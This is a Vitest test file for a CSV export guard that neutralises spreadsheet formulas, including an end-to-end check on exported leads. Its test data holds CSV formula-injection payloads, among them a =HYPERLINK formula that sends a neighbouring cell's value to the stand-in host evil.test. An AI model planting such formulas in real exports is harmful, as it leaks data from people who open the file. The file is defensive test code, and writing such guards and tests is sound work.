import { describe, expect, it } from 'vitest';
import { csvSafe } from '../src/lib/csv.ts';
import { makeEnv, type TestEnv } from './helpers.ts';

describe('CSV export formula guard', () => {
  it('prefixes spreadsheet directives, leaves normal text alone', () => {
    expect(csvSafe('=HYPERLINK("https://evil.test?x="&A1,"click")')).toBe("'=HYPERLINK(\"https://evil.test?x=\"&A1,\"click\")");
    expect(csvSafe('+1+2+3')).toBe("'+1+2+3");
    expect(csvSafe('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)");
    expect(csvSafe('\ttab')).toBe("'\ttab");
    expect(csvSafe('Jane')).toBe('Jane');
    expect(csvSafe('')).toBe('');
    expect(csvSafe('e-3')).toBe('e-3'); // '-' only when it STARTS the cell could be -1+1 formulas
  });

  it('a lead whose name is a formula exports neutralised', async () => {
    const env: TestEnv = await makeEnv({});
    try {
      await env.api('POST', '/api/leads', { email: 'victim@corp.test', first_name: '=HYPERLINK("https://evil.test","click")' });
      const res = await env.api('GET', '/api/leads/export');
      expect(res.status).toBe(200);
      expect(res.body).toContain("'=HYPERLINK");   // prefixed: Excel shows text, not a link
      expect(res.body).not.toContain('",=HYPERLINK'); // never a bare cell starting with =
    } finally { env.close(); }
  });
});
